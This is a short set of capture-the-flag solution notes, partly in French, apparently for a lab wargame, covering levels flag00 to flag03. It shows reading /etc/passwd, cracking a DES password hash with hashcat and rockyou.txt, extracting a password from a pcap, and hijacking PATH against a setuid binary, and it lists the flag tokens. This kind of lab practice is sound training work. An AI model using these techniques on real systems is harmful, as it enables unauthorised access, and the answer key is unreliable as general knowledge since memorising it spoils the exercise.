# flag 00

cd /
find / -user flag00
cat /rofs/usr/sbin/john

cdiiddwpgswtgt

code césar > 15
nottoohardhere

## Flag : x24ti5gi3x0ol2eh4esiuxias


# flag 01

cat /etc/passwd | grep flag01
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash


hashcat -m 1500 42hDRfypTqqnw rockyou.txt
42hDRfypTqqnw:abcdefg                                     
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1500 (descrypt, DES (Unix), Traditional DES)
Hash.Target......: 42hDRfypTqqnw
Time.Started.....: Sun Feb 22 12:46:26 2026 (0 secs)
Time.Estimated...: Sun Feb 22 12:46:26 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 36298.6 kH/s (5.82ms) @ Accel:512 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 676973/14344384 (4.72%)
Rejected.........: 152685/676973 (22.55%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> clyde8
Hardware.Mon.#1..: Temp: 63c Util:  0% Core:1500MHz Mem:6001MHz Bus:8

Started: Sun Feb 22 12:46:18 2026
Stopped: Sun Feb 22 12:46:27 2026

## Flag : f2av5il02puano7naaf6adaaf

# flag 02

ouvrir level02.pcap dans wireshark

après le paquet "password:" reçu ft_wandr(DEL)(DEL)(DEL)NDRel(DEL)L0L
ft_waNDReL0L

## Flag : kooda2puivaav1idi4f57q8iq

# flag03

ouverture de level03 (executable dans ghidra):
setresgid et setresuid avec l'user flag03
et ensuite la commande executée est /usr/bin/env echo Exploit me

il suffit de créer un executable nommée echo et le mettre plus tôot dans le PATH:

cd ..
chmod 777 level03
(set les permissions pour écrire dans notre home)
nano echo

#!/bin/bash

getflag

export PATH="/home/user/level03:$PATH"

chmod +x echo

./level03

## flag : qi0maab88jeaj46qoumi7maus

# Flag04
